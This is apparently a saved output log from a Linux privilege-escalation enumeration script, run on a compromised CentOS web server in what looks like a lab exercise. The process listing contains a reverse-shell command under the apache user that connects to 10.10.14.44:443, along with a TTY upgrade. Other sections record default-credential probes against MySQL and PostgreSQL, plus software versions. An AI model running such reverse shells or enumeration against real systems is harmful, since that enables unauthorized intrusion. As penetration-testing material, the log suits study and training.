+root          2  0.0  0.0      0     0 ?        S    14:48   0:00 [kthreadd]
+root          3  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [ksoftirqd/0]
+root          5  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [kworker/0:0H]
+root          6  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [kworker/u256:0]
+root          7  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [migration/0]
+root          8  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [rcu_bh]
+root          9  0.0  0.0      0     0 ?        R    14:48   0:00  \_ [rcu_sched]
+root         10  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [lru-add-drain]
+root         11  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [watchdog/0]
+root         13  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [kdevtmpfs]
+root         14  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [netns]
+root         15  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [khungtaskd]
+root         16  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [writeback]
+root         17  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [kintegrityd]
+root         18  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [bioset]
+root         19  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [bioset]
+root         20  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [bioset]
+root         21  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [kblockd]
+root         22  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [md]
+root         23  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [edac-poller]
+root         24  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [watchdogd]
+root         30  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [kswapd0]
+root         31  0.0  0.0      0     0 ?        SN   14:48   0:00  \_ [ksmd]
+root         32  0.0  0.0      0     0 ?        SN   14:48   0:00  \_ [khugepaged]
+root         33  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [crypto]
+root         41  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [kthrotld]
+root         42  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [kworker/u256:1]
+root         43  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [kmpath_rdacd]
+root         44  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [kaluad]
+root         45  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [kpsmoused]
+root         47  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [ipv6_addrconf]
+root         60  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [deferwq]
+root         91  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [kauditd]
+root        731  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [ata_sff]
+root        751  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [scsi_eh_0]
+root        758  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [scsi_tmf_0]
+root        760  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [scsi_eh_1]
+root        767  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [scsi_tmf_1]
+root       1005  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [nfit]
+root       1451  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [ttm_swap]
+root       1453  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [irq/16-vmwgfx]
+root       1827  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [mpt_poll_0]
+root       1832  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [mpt/0]
+root       2056  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [scsi_eh_2]
+root       2057  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [scsi_tmf_2]
+root       2841  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [kworker/0:1H]
+root       2883  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [kdmflush]
+root       2884  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [bioset]
+root       2898  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [kdmflush]
+root       2899  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [bioset]
+root       2917  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [bioset]
+root       2922  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfsalloc]
+root       2927  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs_mru_cache]
+root       2930  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-buf/dm-0]
+root       2933  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-data/dm-0]
+root       2936  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-conv/dm-0]
+root       2937  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-cil/dm-0]
+root       2938  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-reclaim/dm-]
+root       2939  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-log/dm-0]
+root       2940  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-eofblocks/d]
+root       2941  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [xfsaild/dm-0]
+root       3082  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-buf/sda1]
+root       3083  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-data/sda1]
+root       3088  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-conv/sda1]
+root       3091  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-cil/sda1]
+root       3094  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-reclaim/sda]
+root       3098  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-log/sda1]
+root       3099  0.0  0.0      0     0 ?        S<   14:48   0:00  \_ [xfs-eofblocks/s]
+root       3100  0.0  0.0      0     0 ?        S    14:48   0:00  \_ [xfsaild/sda1]
+root       3887  0.0  0.0      0     0 ?        S    14:53   0:00  \_ [kworker/0:0]
+root       3902  0.0  0.0      0     0 ?        S    15:00   0:00  \_ [kworker/0:1]
+root       3936  0.0  0.0      0     0 ?        S    15:06   0:00  \_ [kworker/0:2]
+root          1  0.1  0.3 125312  3776 ?        Ss   14:48   0:01 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
+root       3008  0.0  0.2  37116  2796 ?        Ss   14:48   0:00 /usr/lib/systemd/systemd-journald
+root       3027  0.0  0.1 124824  1328 ?        Ss   14:48   0:00 /usr/sbin/lvmetad -f
+root       3029  0.0  0.1  44516  1896 ?        Ss   14:48   0:00 /usr/lib/systemd/systemd-udevd
+root       4451  0.0  0.0  44516   936 ?        S    15:09   0:00  \_ /usr/lib/systemd/systemd-udevd
+root       3156  0.0  0.0  55520   904 ?        S<sl 14:48   0:00 /sbin/auditd
+root       3178  0.0  0.1  26376  1760 ?        Ss   14:48   0:00 /usr/lib/systemd/systemd-logind
+polkitd    3179  0.0  1.3 612996 12988 ?        Ssl  14:48   0:00 /usr/lib/polkit-1/polkitd --no-debug
+dbus       3181  0.0  0.2  58260  2552 ?        Ss   14:48   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+root       3186  0.0  0.6  99672  6092 ?        Ss   14:48   0:00 /usr/bin/VGAuthService -s
+root       3187  0.0  0.6 300820  6332 ?        Ssl  14:48   0:01 /usr/bin/vmtoolsd
+root       3195  0.0  0.1 126284  1592 ?        Ss   14:48   0:00 /usr/sbin/crond -n
+root       3200  0.0  2.9 358288 29100 ?        Ssl  14:48   0:00 /usr/bin/python -Es /usr/sbin/firewalld --nofork --nopid
+root       3202  0.0  0.0 110104   868 tty1     Ss+  14:48   0:00 /sbin/agetty --noclear tty1 linux
+root       3240  0.0  0.8 475888  8232 ?        Ssl  14:49   0:00 /usr/sbin/NetworkManager --no-daemon
+root       3652  0.0  0.3 214444  3948 ?        Ssl  14:49   0:00 /usr/sbin/rsyslogd -n
+root       3653  0.0  1.2 314672 12128 ?        Ss   14:49   0:00 /usr/sbin/httpd -DFOREGROUND
+apache     3688  0.0  0.8 315128  8108 ?        S    14:49   0:00  \_ /usr/sbin/httpd -DFOREGROUND
+apache     3689  0.0  1.0 315136 10248 ?        S    14:49   0:00  \_ /usr/sbin/httpd -DFOREGROUND
+apache     3916  0.0  0.1  11680  1368 ?        S    15:01   0:00  |   \_ /bin/bash -c bash -i >& /dev/tcp/10.10.14.44/443 0>&1
+apache     3917  0.0  0.1  11684  1716 ?        S    15:01   0:00  |       \_ bash -i
+apache     3930  0.0  0.4  26028  4748 ?        S    15:05   0:00  |           \_ python -c import pty; pty.spawn("/bin/bash")
+apache     3931  0.0  0.1  11816  1844 pts/0    Ss   15:05   0:00  |               \_ /bin/bash
+apache     3959  0.7  0.1   9844  1820 pts/0    S+   15:09   0:00  |                   \_ /bin/bash ./lse.sh -l2
+apache     4647  0.0  0.1   9844  1148 pts/0    S+   15:09   0:00  |                       \_ /bin/bash ./lse.sh -l2
+apache     4648  0.0  0.1  51868  1816 pts/0    R+   15:09   0:00  |                           \_ ps auxf
+apache     3690  0.0  1.0 315128 10772 ?        S    14:49   0:00  \_ /usr/sbin/httpd -DFOREGROUND
+apache     3691  0.0  1.0 315640 10128 ?        S    14:49   0:00  \_ /usr/sbin/httpd -DFOREGROUND
+apache     3692  0.0  0.7 314804  7880 ?        S    14:49   0:00  \_ /usr/sbin/httpd -DFOREGROUND
+apache     3870  0.0  0.7 314808  7688 ?        S    14:50   0:00  \_ /usr/sbin/httpd -DFOREGROUND
+root       3654  0.0  1.9 573924 19148 ?        Ssl  14:49   0:00 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
+root       3656  0.0  0.4 112864  4312 ?        Ss   14:49   0:00 /usr/sbin/sshd -D
+root       3671  0.0  0.2 111192  2812 ?        Ss   14:49   0:00 sendmail: accepting connections
+smmsp      3686  0.0  0.2 106616  2024 ?        Ss   14:49   0:00 sendmail: Queue runner@01:00:00 for /var/spool/clientmqueue
+root       3913  0.0  0.0 123260   740 ?        Ss   15:01   0:00 /usr/sbin/anacron -s
+---
+[i] pro510 Running process binaries and permissions........................ yes!
+---
+-rwxr-xr-x. 1 root root 2580744 Mar 14  2019 /usr/sbin/NetworkManager
+-rwxr-xr-x. 1 root root 128512 Nov  2  2018 /usr/bin/VGAuthService
+-rwxr-xr-x. 1 root root 49680 Mar 14  2019 /usr/sbin/agetty
+-rwxr-xr-x. 1 root root 36448 Nov 20  2018 /usr/sbin/anacron
+-rwxr-xr-x. 1 root root 124536 Oct 30  2018 /usr/sbin/auditd
+-rwxr-xr-x. 1 root root 964608 Oct 30  2018 /usr/bin/bash
+-rwxr-xr-x. 1 root root 70216 Nov 20  2018 /usr/sbin/crond
+-rwxr-xr-x. 1 root root 223320 Mar 14  2019 /usr/bin/dbus-daemon
+-rwxr-xr-x. 1 root root 7031 Oct 30  2018 /usr/sbin/firewalld
+-rwxr-xr-x. 1 root root 523672 Apr 24  2019 /usr/sbin/httpd
+-r-xr-xr-x 1 root root 69368 Jul  3  2019 /usr/sbin/lvmetad
+-rwxr-xr-x. 1 root root 100208 Oct 30  2018 /usr/bin/ps
+lrwxrwxrwx. 1 root root 7 Jul  2  2019 /usr/bin/python -> python2
+-rwxr-xr-x. 1 root root 664080 Oct 31  2018 /usr/sbin/rsyslogd
+lrwxrwxrwx. 1 root root 21 Jul  2  2019 /usr/sbin/sendmail -> /etc/alternatives/mta
+-rwxr-xr-x. 1 root root 117752 Oct 30  2018 /usr/bin/sort
+-rwxr-xr-x. 1 root root 853040 Apr 11  2018 /usr/sbin/sshd
+-rwxr-xr-x. 1 root root 3182 Jul  4  2018 /usr/sbin/tuned
+-rwxr-xr-x. 1 root root 45856 Oct 30  2018 /usr/bin/uniq
+-rwxr-xr-x. 1 root root 48984 Nov  2  2018 /usr/bin/vmtoolsd
+-rwxr-xr-x. 1 root root 62368 Oct 30  2018 /usr/bin/xargs
+---
+===============================================================( software )=====
+[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
+[!] sof010 Can we connect to MySQL as root without password?............... nope
+[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
+[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
+[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
+[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
+[*] sof030 Installed apache modules........................................ yes!
+---
+Loaded Modules:
+ core_module (static)
+ so_module (static)
+ http_module (static)
+ access_compat_module (shared)
+ actions_module (shared)
+ alias_module (shared)
+ allowmethods_module (shared)
+ auth_basic_module (shared)
+ auth_digest_module (shared)
+ authn_anon_module (shared)
+ authn_core_module (shared)
+ authn_dbd_module (shared)
+ authn_dbm_module (shared)
+ authn_file_module (shared)
+ authn_socache_module (shared)
+ authz_core_module (shared)
+ authz_dbd_module (shared)
+ authz_dbm_module (shared)
+ authz_groupfile_module (shared)
+ authz_host_module (shared)
+ authz_owner_module (shared)
+ authz_user_module (shared)
+ autoindex_module (shared)
+ cache_module (shared)
+ cache_disk_module (shared)
+ data_module (shared)
+ dbd_module (shared)
+ deflate_module (shared)
+ dir_module (shared)
+ dumpio_module (shared)
+ echo_module (shared)
+ env_module (shared)
+ expires_module (shared)
+ ext_filter_module (shared)
+ filter_module (shared)
+ headers_module (shared)
+ include_module (shared)
+ info_module (shared)
+ log_config_module (shared)
+ logio_module (shared)
+ mime_magic_module (shared)
+ mime_module (shared)
+ negotiation_module (shared)
+ remoteip_module (shared)
+ reqtimeout_module (shared)
+ rewrite_module (shared)
+ setenvif_module (shared)
+ slotmem_plain_module (shared)
+ slotmem_shm_module (shared)
+ socache_dbm_module (shared)
+ socache_memcache_module (shared)
+ socache_shmcb_module (shared)
+ status_module (shared)
+ substitute_module (shared)
+ suexec_module (shared)
+ unique_id_module (shared)
+ unixd_module (shared)
+ userdir_module (shared)
+ version_module (shared)
+ vhost_alias_module (shared)
+ dav_module (shared)
+ dav_fs_module (shared)
+ dav_lock_module (shared)
+ lua_module (shared)
+ mpm_prefork_module (shared)
+ proxy_module (shared)
+ lbmethod_bybusyness_module (shared)
+ lbmethod_byrequests_module (shared)
+ lbmethod_bytraffic_module (shared)
+ lbmethod_heartbeat_module (shared)
+ proxy_ajp_module (shared)
+ proxy_balancer_module (shared)
+ proxy_connect_module (shared)
+ proxy_express_module (shared)
+ proxy_fcgi_module (shared)
+ proxy_fdpass_module (shared)
+ proxy_ftp_module (shared)
+ proxy_http_module (shared)
+ proxy_scgi_module (shared)
+ proxy_wstunnel_module (shared)
+ systemd_module (shared)
+ cgi_module (shared)
+ php5_module (shared)
+---
+[!] sof040 Found any .htpasswd files?...................................... nope
+[i] sof500 Sudo version.................................................... yes!
+---
+Sudo version 1.8.23
+---
+[i] sof510 MySQL version................................................... nope
+[i] sof520 Postgres version................................................ nope
+[i] sof530 Apache version.................................................. yes!
+---
+Server version: Apache/2.4.6 (CentOS)
+Server built:   Apr 24 2019 13:45:48
+---
+=============================================================( containers )=====
+[*] ctn000 Are we in a docker container?................................... nope
+[*] ctn010 Is docker available?............................................ nope
+[!] ctn020 Is the user a member of the 'docker' group?..................... nope
+[*] ctn200 Are we in a lxc container?...................................... nope
+[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
+
+==================================( FINISHED )==================================
